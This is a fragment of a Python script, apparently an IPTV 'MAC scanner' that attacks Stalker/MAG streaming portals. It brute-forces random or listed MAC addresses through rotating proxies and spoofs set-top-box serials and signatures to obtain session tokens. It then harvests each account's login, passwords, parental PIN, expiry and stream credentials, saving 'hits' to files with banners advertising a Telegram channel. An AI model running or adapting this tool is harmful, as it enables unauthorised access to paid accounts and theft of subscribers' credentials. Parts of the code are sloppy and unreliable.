╠☞ Scanner☞  """+my_py+"""     
╠☞ CPU☞  """+str(my_cpu)+"""  
╠☞ 𝕊𝙲𝙰𝙽 𝔻𝙰𝚃𝙴:"""+str(time.strftime('%H:%M:%S'))+""" / """+str(time.strftime('%d-%m-%Y'))+"""
╠☞ 🆂🄲🄰🄽✩🅸🄽🄵🄾
╠☞ 𝕊𝙲𝙰𝙽 𝔹𝚈:☞ """+nickn+""" ☜  
╠☞ HɪᴛTɪᴍᴇ: """+str(time.strftime('%H:%M / %d.%m.%Y'))+"""
╠☞ ℙ𝙾𝚁𝚃𝙰𝙻: http://"""+str(panell)+"""/c/
╠☞ ℝ𝙴𝙰𝙻: """+str(reall)+"""
╠☞ ℙ𝙾𝚁𝚃𝙰𝙻 𝕋𝚈𝙿𝙴: """+str(uzmanm)+"""
╠☞ 𝕄𝙰𝙲:☞ """+str(mac)+"""
╠☞ 𝔼𝙽𝙳𝚂:☞ """+str(trh)+"""
╠☞ Modded:☞ """+nickn+""" ☜ 
╠☞ 𝔸𝙳𝚄𝙻𝚃 ℙ𝙰𝚂𝚂w𝙾𝚁𝙳☞: 0000
╠☞ 🄺🄰🅽🄰🅻✩🄲🅷🅴🅲🄺
╠☞ 𝕄𝙰𝙲: """+str(durum)+"""
╠☞ 𝕄𝟹𝚄: """+m3uimage+"""
╠☞ https://t.me/malayalamIPTV9
╚════════☰ ℂ𝙻𝙸𝙴𝙽𝚃 𝕀𝙿:"""+str(vpn)+""" """
		ximza="""
"""+str(playerapi)+"""     """
		sifre=device(mac)
		pimza="""
╔══ https://t.me/malayalamIPTV9
╠☞ 𝕄𝟹𝚄 ℙ𝙾𝚁𝚃𝙰𝙻: """+str(m3ulink)+""" """
		imza=imza+sifre+simza+ximza+pimza
		if len(kanalsayisi) > 1:
			imza=imza+""" 
╔══ 🅼🄴🄳🄸🄰✩https://t.me/malayalamIPTV9
╠☞ ℂ𝙷𝙰𝙽𝙽𝙴𝙻𝚂: """+kanalsayisi+"""
╠☞ 𝕍𝙾𝙳:"""+filmsayisi+"""
╠☞ 𝕊𝙴𝚁𝙸𝙴𝚂: """+dizisayisi+""" """
		if  kanalkata=="1" or kanalkata=="2":
			imza=imza+""" 
╔══ 🅲🄾🅄🄽🅃🅁🅈✩https://t.me/malayalamIPTV9
╠☞ 《ℂℍ𝔸ℕℕ𝔼𝕃𝕊》
╠☞ """+str(livelist)+""" """
		if kanalkata=="2":
			imza=imza+"""  
╠☞ 《𝕍𝕆𝔻》
╠☞ """+str(vodlist)+"""
╠☞ 《𝕊𝔼ℝ𝕀𝔼𝕊》
╠☞ """+str(serieslist)+"""
╠☞ ULTIMAX-PRO√¹✶ 
╠☞ #𝐏𝐫𝐞𝐦𝐢𝐮𝐦𝐏𝐲𝐅𝐫𝐞𝐞 ღ  
║ ⟁⃤P  https://t.me/malayalamIPTV9L⟁⃤
╚═════════ ▼ ═════════╝"""
 

			imza2 = """\n"""+ str(mac) + """"""
			
			imza1 =""" 			
╔═▼─https://t.me/malayalamIPTV9▼═╗
╠☞ 🆂🄲🄰🄽✩🆂🅈🆂🅃🅴🅼
╠☞ System ☞  """+my_os+"""      
╠☞ Scanner ☞  """+my_py+"""      
╠☞ CPU ☞  """+str(my_cpu)+"""  
╠☞ 𝕊𝙲𝙰𝙽 𝔻𝙰𝚃𝙴:☞ """+str(time.strftime('%H:%M:%S'))+""" / """+str(time.strftime('%d-%m-%Y'))+"""
╠☞ Modded:☞ """+nickn+""" ☜ 
╠☞ ℙ𝙾𝚁𝚃𝙰𝙻:☞ http://"""+str(panell)+"""/c/
╠☞ ℙ𝙾𝚁𝚃𝙰𝙻 𝕋𝚈𝙿𝙴:☞ """+str(uzmanm)+"""
╠☞ 𝕄𝙰𝙲:☞ """+str(mac)+"""
╠☞ 𝔼𝙽𝙳𝚂:☞ """+str(trh)+"""
╠☞ 𝕊𝙲𝙰𝙽 𝔹𝚈:☞ """+nickn+""" ☜  
╚═══https://t.me/malayalamIPTV9═══╝
  \n"""		


		imza=imza
		yaz(imza1)				
		yam(imza2)
		yax(imza)
		hitsay=hitsay+1
		print(imza1)
		if hitsay >= hit:
			hitr="\33[1;33m"
	#except:pass

def data_server(scountry):
    
    bandera=''
    pais=''
    origen=''
    try:        
        codpais=scountry
        bandera=flag.flag(codpais)
        origen=bandera
    except:pass
    return origen



import os
nickn=""
white=("""\033[38;5;94m\n""") 
if nickn=="":
	nickn=input("""\n
\033[38;5;94mIl tuo nome :      
Se non lo scrvi, il nome è «AreA51»
«1 = AREA51 » ou «2 = AREA51-MAC »
Verrà scritto automaticamente HiTS.FiLE
\033[38;5;229mFai ENTER O scrivi il tuo nome:= """)
      
if nickn == '':
    nickn = 'AreA51'
elif nickn == "1":
    nickn = "AREA51"
elif nickn == "2":
    nickn = "AREA51-MAC"

hitsf=rootDir+'/Hits/'
if not os.path.exists(hitsf):
    os.mkdir(hitsf)

hits=rootDir+'/Hits/ULTIMAX/'
if not os.path.exists(hits):
    os.mkdir(hits)

hitsf=rootDir+'/Hits/ULTIMAX/𝐌𝐈𝐍𝐈★𝐇𝐈𝐓𝐒/'
if not os.path.exists(hitsf):
    os.mkdir(hitsf)

hitsf=rootDir+'/Hits/ULTIMAX/𝐅𝐔𝐋𝐋★𝐇𝐈𝐓𝐒/'
if not os.path.exists(hitsf):
    os.mkdir(hitsf)

hitsf=rootDir+'/Hits/ULTIMAX/𝐌𝐀𝐂★𝐇𝐈𝐓𝐒/'
if not os.path.exists(hitsf):
    os.mkdir(hitsf)



hitsay=0
say=1
def yaz(hits):
    dosya = open(DosyaA, 'a+', encoding='utf-8')
    dosya.write(hits)
    dosya.close()


def yax(hits):
    dosya = open(Dosyab, 'a+', encoding='utf-8')
    dosya.write(hits)
    dosya.close()


def yam(hits):
    dosya = open(Dosyac, 'a+', encoding='utf-8')
    dosya.write(hits)
    dosya.close()

def device(mac):
	mac=mac.upper()
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper() #SN
	SNCUT=SNENC[:13]#Sncut
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper() #dev1
	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1=DEV1.upper()#dev2
	SG=SNCUT+'+'+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper()	
	sifre="""
╔══ https://t.me/malayalamIPTV9
╠☞ ғᴜʟʟsᴇʀɪᴀʟ: """ +SN+"""   
╠☞ sᴇʀɪᴀʟ ɴᴜᴍʙᴇʀ: """ +SNCUT+"""
╠☞ ɪᴅ1: """ +DEVENC+"""
╠☞ ɪᴅ2: """ +DEVENC1+"""
╠☞ sɪɢɴᴀᴛᴜʀᴇ: """ +SINGENC+"""
╚═══https://t.me/malayalamIPTV9════☰ """		
	return sifre
def list(listlink,mac,token,livel):
	kategori=""
	country_record = ' Afghanistan | Albania | Algeria | Andorra | Angola | Antigua and Barbuda | Argentina | Armenia | Australia | Austria | Azerbaijan | Bahamas | Bahrain | Bangladesh | Barbados | Belarus | Belgium | Belize | Benin | Bhutan | Bolivia | Bosnia and Herzegovina | Botswana | Brazil | Brunei | Bulgaria | Burkina Faso | Burundi | Cabo Verde | Cambodia | Cameroon | Canada | Central African Republic | Chad | Chile | China | Colombia | Comoros | Congo | Costa Rica | Côte d’Ivoire | Croatia | Cuba | Cyprus | Czech Republic | Denmark | Djibouti | Dominica | Dominican Republic | East Timor | Ecuador | Egypt | El Salvador | Equatorial Guinea | Eritrea | Estonia | Eswatini | Ethiopia | Fiji | Finland | France | Gabon | Gambia | Georgia | Germany | Ghana | Greece | Grenada | Guatemala | Guinea | Guinea-Bissau | Guyana | Haiti | Honduras | Hungary | Iceland | India | Indonesia | Iran | Iraq | Ireland | Israel | Italy | Jamaica | Japan | Jordan | Kazakhstan | Kenya | Kiribati | North Korea | South Korea | Kosovo | Kuwait | Kyrgyzstan | Laos | Latvia | Lebanon | Lesotho | Liberia | Libya | Liechtenstein | Lithuania | Luxembourg | Madagascar | Malawi | Malaysia | Maldives | Mali | Malta | Marshall Islands | Mauritania | Mauritius | Mexico | Federated States of Micronesia | Moldova | Monaco | Mongolia | Montenegro | Morocco | Mozambique | Burma | Myanmar | Namibia | Nauru | Nepal | Netherlands | New Zealand | Nicaragua | Niger | Nigeria | North Macedonia | Norway | Oman | Pakistan | Palau | Panama | Papua New Guinea | Paraguay | Peru | Philippines | Poland | Portugal | Qatar | Romania | Russia | Rwanda | Saint Kitts and Nevis | Saint Lucia | Saint Vincent and the Grenadines | Samoa | San Marino | Sao Tome and Principe | Saudi Arabia | Senegal | Serbia | Seychelles | Sierra Leone | Singapore | Slovakia | Slovenia | Solomon Islands | Somalia | South Africa | Spain | Sri Lanka | Sudan | South Sudan | Suriname | Sweden | Switzerland | Syria | Taiwan | Tajikistan | Tanzania | Thailand | Togo | Tonga | Trinidad and Tobago | Tunisia | Turkey | Turkmenistan | Tuvalu | Uganda | Ukraine | United Arab Emirates | United Kingdom | United States | Uruguay | Uzbekistan | Vanuatu | Vatican City | Venezuela | Vietnam | Yemen | Zambia | Zimbabwe | Abkhazian | Afar | Afrikaans | Akan | Albanian | Amharic | Arabic | Aragonese | Armenian | Assamese | Avaric | Avestan | Aymara | Azerbaijani | Bambara | Bashkir | Basque | Belarusian | Bengali | Bislama | Bosnian | Breton | Bulgarian | Burmese | Canadien | Catalan | Chamorro | Chechen | Chichewa | Chinese | Slavonic | Chuvash | Cornish | Corsican | Cree | Croatian | Czech | Danish | Divehi | Dhivehi | Maldivian | Dutch | Dzongkha | English | Esperanto | Estonian | Ewe | Faroese | Fijian | Finnish | French | Western Frisian | Fulah | Gaelic | Galician | Ganda | Georgian | German | Greek | KalaallisutGreenlandic | Guarani | Gujarati | Haitian | Hausa | Hebrew | Herero | Hindi | Hiri Motu | Hungarian | Icelandic | Ido | Igbo | Indonesian | Interlingua | Interlingue | Inuktitut | Inupiaq | Irish | Italian | Japanese | Javanese | Kannada | Kanuri | Kashmiri | Kazakh | Khmer | Cambodian | Kikuyu | Gikuyu | Kinyarwanda | Kirghiz | Kyrgyz | Komi | Kongo | Korean | Kuanyama | Kwanyama | Kurdish | Lao | Latin | Latvian | Limburgan | Limburger | Limburgish | Lingala | Lithuanian | Luba-Katanga | Luxembourgish | Letzeburgesch | Macedonian | Malagasy | Malay | Malayalam | Maltese | Manx | Maori | Māori | Marathi | Marāṭhī | Marshallese | Mongolian | Nauru | Nauruan | Navajo | Navaho | North Ndebele | Northern Ndebele | South Ndebele | Southern Ndebele | Ndonga | Nepali | Norwegian | Sichuan Yi | Nuosu | Occitan | Ojibwa | Oriya | Oromo | Ossetian | Ossetic | Pali | Pashto | Pushto | Persian | Farsi | Polish | Portuguese | Punjabi | Panjabi | Quechua | Romanian | Moldavian | Moldovan | Romansh | Rundi | Russian | Northern Sami | Samoan | Sango | Sanskrit | Sardinian | Serbian | Shona | Sindhi | Sinhala | Sinhalese | Slovak | Slovenian | Somali | Southern Sotho | Spanish | Castilian | Sundanese | Swahili | Swati | Swedish | Tagalog | Filipino | Tahitian | Tajik | Tamil | Tatar | Telugu | Thai | Tibetan | Tigrinya | Tonga | Tongan | Tsonga | Tswana | Turkish | Turkmen | Twi | Uighur | Uyghur | Ukrainian | Urdu | Uzbek | Venda | Vietnamese | Volapük | Walloon | Welsh | Wolof | Xhosa | Yiddish | Yoruba | Zhuang | Chuang | Zulu | canada | usa | uk | germany | vietnam | africa | india | latino | colombia | argentina | portugal | brazil | chile | peru | australia | italy | greek | caribbean | philippines | france | us/ca | tajikistan | uzbekistan | venezuela | spain | salvador | guatemala | honduras | panama | haiti | mexico | latvia | armenia | estonia | belarus | brasil | Algeria | malta | puerto rico | afghanistan | bulgaria | lithunia | ukraine | russia | indonesia | sri lanka | hongkong | south korea | Afghan | Sudan | Libya | china | malesyia | malaysia | kurdish | taiwan | azerbejian | Kannada | Persian | azerbaijan | arabic | pakistan | georgia | kazachstan | Kazakhstan | australia | Bangla/Bengali | Urdu | Palestine | Telugu | Malayalam | Marathi | Oriya | Gujarat | Somali | thailand | iran | iraq | Sinhala | Hindi | Tamil | israel | Punjabi | switzerland | turkey | Egypt | finland | denmark | sweden | norway | hungary | czech republic | belgium | grecce | romania | netherland | spain | poland | albania | ireland | latin | netherlands | czech | belize | dominican | Lebanon | Gulf | Nepali | argentina | congo | Saudia Arabia | cameroon | kenya | ethiopia | jordan | kuwait | uae | Slovenia | cambodia | Syria | indonesia | bahrain | austria | canadian | filipino | Tunisia | Morocco | english | African | Australian | Brazilian | Danish | Dutch/Belgian | French | German | Indian | Italian | Nordic | Polish | Portuguese | Romanian | Spanish | Swedish | Canadian | Irish | turkish | chinese | Ukrainian | costa rica | dominicana | uruguay | paraguay | nicaragua | ecuador | cuba | united kingdom | united states | espanha | italia | swiss | scandinavia | balkan | can | eng | portugal/brazil | macedonia | espania | turkiye | rep dominicana | espana | deutchland | letzebuerg | Nederland | turquia | românia | ca | us | de | vn | za | co | ar | pt | br | cl | pe | au | it | gr | ph | fr | tj | uz | ve | es | sv | gt | hn | pa | ht | mx | lv | id | am | ee | by | mt | pr | af | bg | lt | ua | ru | id | lk | hk | kr | cn | my | tw | az | pk | ge | kz | au | th | ir | iq | il | ch | tr | fi | dk | se | no | hu | be | gr | ro | cd | cm | ke | et | jo | kw | kh | id | bh | at | ca | uy | py | ni | ec | cu | us | mk |dz | sd | ly | tn '
	veri=""
	while True:
		try:
			res = ses.get(listlink,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3), verify=False)
			veri=str(res.text)
			break
		except:pass
	if veri.count('title":"')>0:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel
	list=kategori
	return list
def m3ugoruntu(cid,user,pas,plink):
	durum="Offline"
	try:
			url=http+"://"+plink+'/live/'+str(user)+'/'+str(pas)+'/'+str(cid)+'.ts'
			res = ses.get(url,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
			if res.status_code==302 or res.status_code==200:
				durum="Online"
	except:
			durum="Offline"
	return durum
hit=0						

def m3uapi(playerlink,mac,token):
	mt=""
	bag=0
	veri=""
	bad=0
	while True:
		try:
			res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
			veri=str(res.text)
			break
		except:
			if not proxi =="1":
				bad=bad+1
				if bad==3:
					break
	if veri=="" or '404' in veri:
		bad=0
		while True:
			try:
				playerlink=playerlink.replace('player_api.php','panel_api.php')
				res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
				veri=str(res.text)
				break
			except:
				if not proxi =="1":
					bad=bad+1
					if bad==3:
						break
	acon=""
	timezone=""
	message=""
	if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1]
				acon=acon.split(',')[0]
				acon=acon.replace('"',"")
				mcon=veri.split('max_connections":')[1]
				mcon=mcon.split(',')[0]
				mcon=mcon.replace('"',"")
				status=veri.split('status":')[1]
				status=status.split(',')[0]
				status=status.replace('"',"")
				try:
					timezone=veri.split('timezone":"')[1]
					timezone=timezone.split('",')[0]
					timezone=timezone.replace("\/","/")
				except:pass
				realm=veri.split('url":')[1]
				realm=realm.split(',')[0]
				realm=realm.replace('"',"")
				port=veri.split('port":')[1]
				port=port.split(',')[0]
				port=port.replace('"',"")
				userm=veri.split('username":')[1]
				userm=userm.split(',')[0]
				userm=userm.replace('"',"")
				pasm=veri.split('password":')[1]
				pasm=pasm.split(',')[0]
				pasm=pasm.replace('"',"")
				bitism=veri.split('exp_date":')[1]
				bitism=bitism.split(',')[0]
				bitism=bitism.replace('"',"")
				try:
					message=veri.split('message":"')[1].split(',')[0].replace('"','')
					message=str(message.encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				if bitism=="null":
					bitism="Unlimited"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
				mt=("""🆇🅃🅁🄴🄰🄼✩🅸🄽🄵🄾
╔══ 𝕄𝙴𝚂𝚂𝙰𝙶𝙴: """+str(message)+""" 
╠☞ ℍ𝙾𝚂𝚃: http://"""+panel+"""/c/
╠☞ ℝ𝙴𝙰𝙻: http://"""+realm+""":"""+port+"""/c/
╠☞ ℙ𝙾𝚁𝚃: """+port+"""
╠☞ 𝕌𝚂𝙴𝚁𝙽𝙰𝙼𝙴: """+userm+"""
╠☞ ℙ𝙰𝚂𝚂𝚆𝙾𝚁𝙳: """+pasm+"""
╠☞ 𝔼𝚇𝙿𝙸𝚁𝙰𝚃𝙸𝙾𝙽: """+bitism+""" 
╠☞ 𝔸𝙲𝚃𝙸𝚅𝙴 ℂ𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽: """+acon+"""
╠☞ 𝕄𝙰𝚇𝙸𝙼𝚄𝙼 ℂ𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽: """+mcon+""" 
╠☞ 𝕊𝚃𝙰𝚃𝚄𝚂: """+status+"""🔋
╠☞ 𝕋𝙸𝙼𝙴 ℤ𝙾𝙽𝙴: """+timezone+"""
╠☞ ℍ𝙸𝚃𝚂 𝔹𝚈:☞ """+nickn+""" ☜ 
╠☞ HɪᴛTɪᴍᴇ: """+str(time.strftime('%H:%M / %d.%m.%Y'))+"""
╠☞ https://t.me/malayalamIPTV9✶ 
 """) 
	return mt
	
							
def goruntu(link,cid):
	#print(link)
	duru="All Good"
	try:
		res = ses.get(link,  headers=hea3(), timeout=10, allow_redirects=False,stream=True)
		#print(res.status_code)
		if res.status_code==302 or res.status_code==200:
			duru="All Good"
	except:
			duru="🔒 , ✔ "
	return duru		
		
def url7(cid):
	url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	if uzmanm=="stalker_portal/server/load.php":
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/"+str(cid)+"&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http:///ch/"+str(cid)+"&&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	return str(url)
	
def hea3():
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea			
def hitecho(mac,trh):
	if rootDir == "./":
		playsound(rootDir+'/sounds/STBMAX5.mp3')
		file = pathlib.Path()
		try:
			if file.exists():
				ad.mediaPlay()
		except:pass
	
	if rootDir == "/sdcard/":
		sesdosya=rootDir+"/sounds/gun.mp3"
		file = pathlib.Path(sesdosya)
		try:
			if file.exists():
			   ad.mediaPlay(sesdosya)
		except:pass
      
def unicode(fyz):
	cod=fyz.encode('utf-8').decode("unicode-escape").replace('\/','/')
	return cod

def duzel2(veri,vr):
	data=""
	try:
		data=veri.split('"'+str(vr)+'":"')[1]
		data=data.split('"')[0]
		data=data.replace('"','')
		data=unicode(data)
	except:pass
	return str(data)
				
def duzelt1(veri,vr):
	data=veri.split(str(vr)+'":"')[1]
	data=data.split('"')[0]
	data=data.replace('"','')
	return str(data)
				
									
import datetime
import time
import hashlib
import urllib
def url2(mac,random):
	macs=mac.upper()
	macs=urllib.parse.quote(macs)
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper() #SN
	SNCUT=SNENC[:13]#Sncut
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper() #dev1
	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1=DEV1.upper()#dev2
	SG=SNCUT+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper() #signature
	url22=http+"://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml"
	if uzmanm=="stalker_portal/server/load.php":
	    times=time.time()
	    url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22'+macs+'%22%2C%22sn%22%3A%22'+SNCUT+'%22%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22%2C%22random%22%3A%22'+random+'%22%7D&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350&timestamp='+str(times)+'&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml'
	    if stalker_portal=="2":
	    	url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: 5.5.0; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG254&image_version=218&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature='+SINGENC+'&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=7c431b0aec69b2f0194c0680c32fe4e3&timestamp='+str(times)+'&api_signature=263&metrics={\\\"mac\\\":\\\"'+macs+'\\\",\\\"sn\\\":\\\"'+SNCUT+'\\\",\\\"model\\\":\\\"MAG254\\\",\\\"type\\\":\\\"STB\\\",\\\"uid\\\":\\\"'+DEVENC+'\\\",\\\"random\\\":\\\"'+random+'\\\"}&JsHttpRequest=1-xml'
	    if stalker_portal=="1":
	    	url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription%3A%200.2.18-r23-254%3B%20ImageDate%3A%20Wed%20Oct%2031%2015%3A22%3A54%20EEST%202018%3B%20PORTAL%20version%3A%205.5.0%3B%20API%20Version%3A%20JS%20API%20version%3A%20343%3B%20STB%20API%20version%3A%20146%3B%20Player%20Engine%20version%3A%200x58c&num_banks=2&sn='+SNCUT+'&client_type=STB&image_version=218&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature='+SINGENC+'&auth_second_step=1&hw_version=2.6-IB-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22'+macs+'%22%2C%22sn%22%3A%22'+SNCUT+'%22%2C%22type%22%3A%22STB%22%2C%22model%22%3A%22MAG254%22%2C%22uid%22%3A%22'+DEVENC+'%22%2C%22random%22%3A%22'+random+'%22%7D&hw_version_2=5ab8c9dceec64b9540bb41bc527e88658aa8c620&timestamp='+str(times)+'&api_signature=262&prehash=4cda0db2375f15f906d2b4df85fc58e05b839d79&JsHttpRequest=1-xml'
	    	
	    	
	if realblue=="real" or uzmanm=="c/portal.php":
		url22=http+"://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
	return url22
def XD():
	global m3uvpn,m3uon,macon,macvpn,bot,hit,tokenr,hitr,respons,color
	bot=bot+1
	for PRL in range(combouz):
		if comboc=="PRL":
			mac=randommac()
		else:
			macv=re.search(pattern,combogetir(),re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		url=http+"://"+panel+"/"+uzmanm+"?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml"
		ses=requests.Session()
		prox=proxygetir()
		oran=round(((combosay)/(combouz)*100),2)
		echok(mac,bot,combosay,hit,oran)
		#print(url)
		while True:
			try:
				res=ses.get(url,headers=hea1(panel,mac),proxies=prox,timeout=(3))
				respons=("** {0}**".format(res))
				respons=format(res.status_code)
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		#print(veri)
		random=""
		if not 'token":"' in veri:
			tokenr="\33[35m"
			ses.close
			res.close
			continue
		tokenr="\33[0m"
		token=duzelt1(veri,"token")
		if 'random' in veri:
			random=duzelt1(veri,"random")
		veri=""
		while True:
			try:
				res=ses.get(url2(mac,random),headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		#print(veri)
		id="null"
		ip=""
		login=""
		parent_password=""
		password=""
		stb_type=""
		tariff_plan_id=""
		comment=""
		country=""
		settings_password=""
		expire_billing_date=""
		max_online=""
		expires=""
		ls=""
		try:
			id=veri.split('{"js":{"id":')[1]
			id=str(id.split(',"name')[0])
		except:pass
		
		try:
				ip=str(duzel2(veri,"ip"))
		except:pass
		try:
			expires=str(duzel2(veri,"expires"))
		except:pass
		if id=="null" and expires=="" and ban=="":
			continue
			ses.close
			res.close
		if uzmanm=="stalker_portal/server/load.php":
			if 'login":"' in veri:
				login=str(duzel2(veri,"login"))
				parent_password=str(duzel2(veri,"parent_password"))
				password=str(duzel2(veri,"password"))
				stb_type=str(duzel2(veri,"stb_type"))
				tariff_plan_id=str(duzel2(veri,"tariff_plan_id"))
				comment=str(duzel2(veri,"comment"))
				country=str(duzel2(veri,"country"))
				settings_password=str(duzel2(veri,"settings_password"))
				expire_billing_date=str(duzel2(veri,"expire_billing_date"))
				ls=str(duzel2(veri,"ls"))
				try:
					max_online=str(duzel2(veri,"max_online"))
				except:pass
		#print(veri)
		url=http+"://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
		
		veri=""
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		#print(veri)
	#	quit()
		if veri.count('phone')==0 and veri.count('end_date')==0 and expires=="" and expire_billing_date=="":
			continue
			ses.close
			res.close
		fname=""
		tariff_plan=""
		ls=""
		trh=""
		bill=""
		if uzmanm=="stalker_portal/server/load.php":
			try:
				fname=str(duzel2(veri,"fname"))
			except:pass
			try:
			    tariff_plan=str(duzel2(veri,"tariff_plan"))
			except:pass
			try:
			    bill=str(duzel2(veri,"created"))
			except:pass
		if "phone" in veri:
			trh=str(duzel2(veri,"phone"))
		if "end_date" in veri:
			trh=str(duzel2(veri,"end_date"))
		if trh=="":
			if not expires=="":
				trh=expires
		try:
			trh=(datetime.datetime.fromtimestamp(int(trh)).strftime('%d-%m-%Y %H:%M:%S'))
		except:pass
		if '(-' in trh:
			continue
			ses.close
			res.close
		
		if trh.lower()[:2] =='un':
			KalanGun=(" Dias")
		else:
			try:
			     		      	KalanGun=(str(tarih_clear(trh))+" Dias")
			     		      	trh=trh+' '+ KalanGun
			except:pass
		if trh=="":
			if uzmanm=="stalker_portal/server/load.php":
				trh=expire_billing_date
		veri=""
		cid="1842"
		url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
		bad=0
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
				veri=str(res.text)
				if 'total' in veri:
					cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				if uzmanm=="stalker_portal/server/load.php":
				     cid=(str(res.text).split('id":"')[5].split('"')[0])
				break
			except:pass
		user=""
		pas=""
		link=""
		
		real=panel
		if not expires=="":
			veri=""
			cmd=""
			url=http+"://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if not 'cmd' in veri:
				continue
			cmd=duzel2(veri,'cmd')
			
			veri=""
			url=http+"://"+panel+"/"+uzmanm+"?type=vod&action=create_link&cmd="+str(cmd)+"&series=&forced_storage=&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if 'cmd":"' in veri:
				link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
				user=str(link.replace('movie/','').split('/')[3])
				real=http+"://"+link.split('://')[1].split('/')[0]+'/c/'
